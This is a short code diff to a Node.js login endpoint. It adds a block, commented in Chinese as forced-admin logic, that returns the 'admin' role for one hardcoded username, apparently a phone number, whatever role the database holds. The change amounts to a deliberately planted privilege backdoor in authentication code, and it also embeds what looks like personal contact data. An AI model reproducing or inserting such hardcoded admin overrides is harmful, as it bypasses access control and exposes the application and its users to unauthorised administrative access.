@@ -139,12 +139,19 @@ app.post('/api/login', async (req, res) => {
                 if (now > expire) isActive = 0; // 已过期
             }
 
+// --- 强制管理员逻辑开始 ---
+            let finalRole = user.role;
+            if (user.username === '16655039535') {
+                finalRole = 'admin'; 
+            }
+            // --- 强制管理员逻辑结束 ---
+
             res.json({
                 success: true,
                 user: {
                     id: user.user_id || user.id,
                     username: user.username,
-                    role: user.role,
+                    role: finalRole, // 使用修改后的角色
                     is_active: isActive,
                     vip_expire_time: user.vip_expire_time
                 }
